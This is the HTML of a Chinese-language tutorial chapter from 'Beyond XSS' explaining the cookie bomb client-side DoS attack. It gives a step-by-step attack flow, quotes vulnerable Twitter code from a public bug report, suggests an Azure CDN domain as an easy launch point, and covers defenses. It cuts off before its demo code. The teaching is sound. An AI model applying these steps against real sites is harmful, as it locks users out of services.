<!doctype html>
<html lang="zh-TW" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-ch4/cookie-bomb" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.3">
<title data-rh="true">有趣又實用的 Cookie bomb | Beyond XSS</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://aszx87410.github.io/beyond-xss/img/cover.png"><meta data-rh="true" name="twitter:image" content="https://aszx87410.github.io/beyond-xss/img/cover.png"><meta data-rh="true" property="og:url" content="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/"><meta data-rh="true" name="docusaurus_locale" content="zh-TW"><meta data-rh="true" name="docsearch:language" content="zh-TW"><meta data-rh="true" name="google-site-verification" content="O7SjDEO9AQXbxqBWhtUW0FVahHxSrnweMXJxLICpSz4"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="有趣又實用的 Cookie bomb | Beyond XSS"><meta data-rh="true" name="description" content="在上一篇裡面我們看到了 cookie tossing，可以藉由寫入 cookie 來影響其他的 same-site domain，而這篇會介紹的是另一種利用 cookie 的攻擊手法，叫做 cookie bomb，一種利用 cookie 所引起的 client-side DoS 攻擊。"><meta data-rh="true" property="og:description" content="在上一篇裡面我們看到了 cookie tossing，可以藉由寫入 cookie 來影響其他的 same-site domain，而這篇會介紹的是另一種利用 cookie 的攻擊手法，叫做 cookie bomb，一種利用 cookie 所引起的 client-side DoS 攻擊。"><link data-rh="true" rel="icon" href="/beyond-xss/img/logo.png"><link data-rh="true" rel="canonical" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/en/ch4/cookie-bomb/" hreflang="en"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="zh-TW"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="x-default"><link rel="stylesheet" href="/beyond-xss/assets/css/styles.32fcb3bb.css">
<link rel="preload" href="/beyond-xss/assets/js/runtime~main.d379f94d.js" as="script">
<link rel="preload" href="/beyond-xss/assets/js/main.f124e165.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="跳至主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳至主要内容</a></div><nav aria-label="主導航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/beyond-xss/"><div class="navbar__logo"><img src="/beyond-xss/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/beyond-xss/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Beyond XSS：探索網頁前端資安宇宙</b></a></div><div class="navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>中文（台灣）</a><ul class="dropdown__menu"><li><a href="/beyond-xss/en/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/beyond-xss/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="zh-TW">中文（台灣）</a></li></ul></div><a href="https://github.com/aszx87410/beyond-xss" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切換淺色/暗黑模式（當前為淺色模式）" aria-label="切換淺色/暗黑模式（當前為淺色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="回到頂部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="文件側邊欄" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/">關於本系列</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/beyond-xss/ch1/browser-security-model/">第一章：從 XSS 開始談前端資安</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/beyond-xss/ch2/xss-defense-sanitization/">第二章：XSS 的防禦方式以及繞過手法</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/beyond-xss/ch3/attack-without-js/">第三章：不直接執行 JavaScript 的攻擊手法</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/beyond-xss/ch4/sop-and-site/">第四章：跨越限制攻擊其他網站</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/sop-and-site/">重中之重：Same-origin policy 與 site</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/cors-intro/">跨來源資源共用 CORS 基本介紹</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/cors-attack/">跨來源的安全性問題</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/csrf/">跨站請求偽造 CSRF 一點就通</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/same-site-cookie/">Same-site cookie，CSRF 的救星？</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ch4/subdomain/">從 same-site 網站打進你家</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/beyond-xss/ch4/cookie-bomb/">有趣又實用的 Cookie bomb</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/beyond-xss/ch5/clickjacking/">第五章：其他有趣的前端資安主題</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/summary/">結語</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/contact/">聯絡作者</a></li></ul></nav></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="頁面路徑"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主頁面" class="breadcrumbs__link" href="/beyond-xss/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">第四章：跨越限制攻擊其他網站</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">有趣又實用的 Cookie bomb</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本頁導覽</button></div><div class="theme-doc-markdown markdown"><h1>有趣又實用的 Cookie bomb</h1><p>在上一篇裡面我們看到了 cookie tossing，可以藉由寫入 cookie 來影響其他的 same-site domain，而這篇會介紹的是另一種利用 cookie 的攻擊手法，叫做 cookie bomb，一種利用 cookie 所引起的 client-side DoS 攻擊。</p><p>講到 DoS，可能會想到是不是要送很多封包給網站，然後讓網站伺服器來不及回應或是資源耗盡才能達成目標；或也可能想到的是 DDoS（Distributed Denial-of-Service），不是一台主機而是一堆主機同時送封包給某個伺服器，然後把它打掛。</p><p>DoS 與 DDoS 其實有分不同層的攻擊，這些層對應到大家可能學過的 OSI 模型，大家印象中的攻擊比較像是 L3 網路層與 L4 傳輸層的攻擊，而 cookie bomb 是存在於 L7 應用層的 DoS 攻擊。</p><p>例如說某個網站有個 API 可以查詢資料，然後有設一個預設的 limit 是 100，結果我把它改成 10000 之後發現 server 大概要一分多鐘才能給我 response，於是我就每兩秒送一個 request，送著送著就發現網站越變越慢，最後整個掛掉只能回 500 Internal Server Error，這就是應用層的 DoS 攻擊。</p><p>只要能找到一個方法讓使用者無法存取網站，就是一種 DoS 的攻擊，而我們找出的方法是建立於 L7 應用層，所以是 L7 的 DoS 攻擊。</p><p>在眾多 L7 DoS 攻擊手法中有一種我覺得特別有趣，那就是 cookie bomb，直翻就叫做 cookie 炸彈。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-bomb-介紹">Cookie bomb 介紹<a href="#cookie-bomb-介紹" class="hash-link" aria-label="Cookie bomb 介紹的直接連結" title="Cookie bomb 介紹的直接連結">​</a></h2><p>要能夠執行 cookie bomb 攻擊的前提是要能寫 cookie。而要達成這個目標基本上有兩種方式，第一種方式是利用網站本身的邏輯。</p><p>舉例來說，假設有個頁面 <code>https://example.com/log?uid=abc</code>，造訪這個頁面之後，就會把 <code>uid=abc</code> 這一段寫到 cookie，那只要把網址改成 <code>?uid=xxxxxxxxxx</code>，就可以把 <code>xxxxxxxxxx</code> 寫到 cookie 裡，這是一種。</p><p>另外一種就是上一篇提到的掌控子網域並能執行 JavaScript 程式碼，可以是透過 subdomain takeover，也可以是透過其他方法。</p><p>那可以寫入任意 cookie 之後能幹嘛呢？開始寫一堆垃圾進去。</p><p>例如說 <code>a1=o....*4000</code> 之類的，就是寫一堆無意義的內容進去就好，這邊要特別注意的是一個 cookie 能寫的大小大概是 4KB，而我們最少需要兩個 cookie，也就是要能寫入 8KB 的資料，才能達成攻擊。</p><p>當你寫了這些 cookie 進去之後，回到主頁 <code>https://example.com</code> 時，根據 cookie 的特性，就會一起把這些垃圾 cookie 帶上去給 server 對吧？接下來就是見證奇蹟的時刻。</p><p>Server 並沒有顯示你平常會看到的頁面，而是回給你一個錯誤：<code>431 Request Header Fields Too Large</code>。</p><p><img loading="lazy" src="/beyond-xss/assets/images/26-01-9e9e072354b015f68c2f47b0a79cdbbc.png" width="1557" height="797" class="img_ev3q"></p><p>在眾多 HTTP 狀態碼裡面，有兩個跟 request 太大有關：</p><ol><li>413 Payload Too Large</li><li>431 Request Header Fields Too Large</li></ol><p>假設有個表單，填了一百萬個字之後送到 server 去，就很可能會收到一個 <code>413 Payload Too Large</code> 的回應，就如同錯誤訊息所說的，payload 太大了，伺服器無法處理。</p><p>而 header 也是一樣的，當你的 cookie 太多時，requset header 中的 <code>Cookie</code> 會很大，大到伺服器無法處理，就會回一個 <code>431 Request Header Fields Too Large</code>（不過根據實測，有些 server 可能會根據實作不同回覆不同的 code，像微軟就是回 400 bad request）。</p><p>因此我們只要能把使用者的 cookie 塞爆，就能讓他看到這個錯誤畫面，沒有辦法正常存取服務，這就是 cookie bomb，藉由一大堆 cookie 所引發的 DoS 攻擊。而背後的原理就是「瀏覽器造訪網頁時，會自動把相對應的 cookie 一起帶上去」。</p><p>Cookie bomb 這名詞最早的起源應該是 2014 年 1 月 18 日由 Egor Homakov 所發表的 <a href="http://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html" target="_blank" rel="noopener noreferrer">Cookie Bomb or let&#x27;s break the Internet.</a>，但類似的攻擊手法在 2009 年就有出現過：<a href="http://sirdarckcat.blogspot.com/2009/04/how-to-use-google-analytics-to-dos.html" target="_blank" rel="noopener noreferrer">How to use Google Analytics to DoS a client from some website</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="攻擊流程">攻擊流程<a href="#攻擊流程" class="hash-link" aria-label="攻擊流程的直接連結" title="攻擊流程的直接連結">​</a></h2><p>如同上面那段所說，假設我們現在發現一個網址 <code>https://example.com/log?uid=abc</code> 可以讓我們設置任意 cookie，接下來要做的事情就是：</p><ol><li>想辦法寫入超過 8KB 的 cookie（因為似乎比較多 server 的限制都是 8KB）</li><li>把這個網址傳給攻擊目標，並想辦法讓他點開</li><li>目標點了網址，在瀏覽器上面設了一個很大的 cookie</li><li>目標造訪網站 <code>https://example.com</code>，發現看不到內容，只能看到一片白或是錯誤訊息，攻擊成功</li></ol><p>這時候除非使用者換個瀏覽器或是 cookie 過期，又或者是自己去把 cookie 清掉，否則一直都會是這個狀態。</p><p>綜合以上所述，這個攻擊只能攻擊特定使用者，而且必須滿足兩個前提：</p><ol><li>找到一個地方可以設置任意 cookie</li><li>目標必須點擊步驟一所找到的網址</li></ol><p>接著我們來看幾個實際案例，第一個是 2015 年由 filedescriptor 回報給推特的漏洞：<a href="https://hackerone.com/reports/57356" target="_blank" rel="noopener noreferrer">DOM based cookie bomb</a>。</p><p>他在推特的網站上找到了如下的程式碼：</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">referrer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;none&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            d </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ev_redir_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encodeURIComponent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;=&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;; path=/&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toLowerCase</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="複製代碼至剪貼簿" title="複製" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>可以看出會把網址列上 hash 的資料以及 <code>document.referrer</code> 放到 cookie 中，而且並沒有對 <code>document.referrer</code> 做任何編碼，因此等於是可以寫入任意的 cookie。於是就可以透過這個漏洞，利用 <code>document.referrer</code> 寫入很長的 cookie，造成 DoS。</p><p>當使用者點了 cookie bomb 的連結之後，連到推特就會看到錯誤頁面。</p><p>第二個則是 s_p_q_r 同樣在 2015 年回報給 Shopify 的漏洞：<a href="https://hackerone.com/reports/105363" target="_blank" rel="noopener noreferrer">[livechat.shopify.com] Cookie bomb at customer chats</a>，他一樣是在程式碼中發現前端會直接利用網址列上的資訊當作 cookie 的內容，而且在寫入之前會先編碼，例如說 <code>,</code> 會變 <code>%2C</code>，長度變成三倍，因此只要傳一個很長的網址，就能夠造成 cookie bomb。</p><p>最後一個是 bihari_web 在 2020 年回報給 NordVPN 的漏洞：<a href="https://hackerone.com/reports/777984" target="_blank" rel="noopener noreferrer">Denial of Service with Cookie Bomb</a>，</p><p>跟前面兩個案例很像，都是發現了網址列上的資訊（例如說 path 或是某個 query string）會被取出後寫入 cookie 中，而且沒有限制長度，因此就能夠利用很長的網址來做出 cookie bomb。</p><p>繼續針對攻擊面往下講以前，先來提一下防禦方式。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="防禦方式">防禦方式<a href="#防禦方式" class="hash-link" aria-label="防禦方式的直接連結" title="防禦方式的直接連結">​</a></h2><p>第一點就是不要相信使用者的輸入，例如說上面提到的那個例子：<code>https://example.com/log?uid=abc</code>，不該把 <code>abc</code> 直接寫進 cookie 裡面，而是應該做個基本檢查，例如說格式或是長度之類的，就可以避免掉這類型的攻擊。</p><p>再來的話，當我提到可以從 subdomain 往 root domain 設 cookie 時，許多人應該都會想到一件事：「那共用的 subdomain 怎麼辦？」</p><p>例如說 GitHub Pages 這功能，每個人的 domain 都是 <code>username.github.io</code> ，那我不就可以用 cookie 炸彈，炸到所有的 GitHub Pages 嗎？只要在我自己的 subdomain 建一個惡意的 HTML，裡面有著設定 cookie 的 JavaScript 程式碼，再來只要把這個頁面傳給任何人，他點擊之後就沒辦法訪問任何 <code>*.github.io</code> 的資源，因為都會被 server 拒絕。</p><p>這個假說看似是成立的，但其實有個前提要先成立，那就是：「使用者可以在 <code>*.github.io</code> 對 <code>github.io</code> 設置 cookie」，如果這個前提不成立，那 cookie bomb 就無法執行了。</p><p>事實上，像是這種「不想要共同的上層 domain 可以被設置 cookie」的需求其實不少，例如說 <code>a.com.tw</code> 如果可以設置 cookie 到 <code>.com.tw</code> 或是 <code>.tw</code> 的話，是不是一大堆不相關的網站都會共享到 cookie 了？這樣顯然是不合理的。</p><p>又或者是總統府的網站 <code>https://www.president.gov.tw</code>，應該不會想被財政部的網站 <code>https://www.mof.gov.tw</code> 所影響，因此 <code>.gov.tw</code> 應該也要是一個不給設定 cookie 的 domain。</p><p>不知道大家還記不記得在講 origin 跟 site 的時候我們其實就有提過這個概念了。</p><p>當瀏覽器在決定能不能對某個 domain 設置 cookie 時，會參照一個清單叫做 <a href="https://publicsuffix.org/list/" target="_blank" rel="noopener noreferrer">public suffix list</a>，出現在上面的 domain，其 subdomain 都沒辦法直接設定該 domain 的 cookie。</p><p>例如說以下 domain 都在這份清單上：</p><ol><li>com.tw</li><li>gov.tw</li><li>github.io</li></ol><p>所以前面舉的例子不成立了，因為我在 <code>userA.github.io</code> 的時候，沒辦法設置 <code>github.io</code> 的 cookie，所以無法執行 cookie bomb 攻擊。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="攻擊面擴展">攻擊面擴展<a href="#攻擊面擴展" class="hash-link" aria-label="攻擊面擴展的直接連結" title="攻擊面擴展的直接連結">​</a></h2><p>上面有講到兩個攻擊成立的前提：</p><ol><li>找到一個地方可以設置任意 cookie</li><li>目標必須點擊步驟一所找到的網址</li></ol><p>如果想讓攻擊變得更容易成立，就可以針對這兩個前提去想說：</p><ol><li>有沒有可能這個地方很好找？</li><li>有沒有可能目標不需要點擊連結就會中招？</li></ol><p>第二點可以透過利用另一種叫做快取污染（Cache poisoning）的漏洞達成。</p><p>顧名思義，這個漏洞就是去污染快取中的內容，例如說現在很多網站都有快取，而不同的使用者可能存取到的都是同一份快取，這時候我就可以想辦法讓快取伺服器儲存的是壞掉的那一個 response，這樣其他人所有使用者也都會拿到壞掉的檔案，看到同樣的錯誤訊息。</p><p>這樣的話，目標不需要點擊任何連結就會中招，而且攻擊對象就從一個人擴大成所有人。</p><p>這有個專有名詞，叫做 <a href="https://cpdos.org/" target="_blank" rel="noopener noreferrer">CPDoS（Cache Poisoned Denial of Service）</a>，而且因為是利用快取的關係，所以其實跟 cookie bomb 沒什麼關係了，你從自己電腦直接發起攻擊也可以，不需要透過 cookie。</p><p>再來我們來看第一點：「有沒有可能這個地方很好找？」。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="找到輕易設置-cookie-的地方">找到輕易設置 cookie 的地方<a href="#找到輕易設置-cookie-的地方" class="hash-link" aria-label="找到輕易設置 cookie 的地方的直接連結" title="找到輕易設置 cookie 的地方的直接連結">​</a></h2><p>有什麼地方可以讓我們輕易設置 cookie，達成 cookie bomb 呢？有，那就是像之前所提過的共用的 subdomain，像是 <code>*.github.io</code> 這一種。</p><p>可是這種的不是都在 public suffix list 裡面了嗎？沒有辦法設置 cookie。</p><p>只要找到沒有在裡面的就好啦！</p><p>不過這其實也不是件容易的事情，因為你會發現你知道的服務幾乎都已經註冊了，例如說 GitHub、AmazonS3、Heroku 以及 Netlify 等等，都已經在上面了。</p><p>不過我有找到一個沒在上面的，那就是微軟提供的 Azure CDN：azureedge.net</p><p>不知道為什麼，但這個 domain 並不屬於 public suffix，所以如果我自己去建一個 CDN，就可以執行 cookie bomb。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="實際測試">實際測試<a href="#實際測試" class="hash-link" aria-label="實際測試的直接連結" title="實際測試的直接連結">​</a></h2><p>我用來 demo 的程式碼如下，參考並改寫自<a href="https://github.com/wrr/cookie-bomb/blob/master/bomb.html" target="_blank" rel="noopener noreferrer">這裡</a>：</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 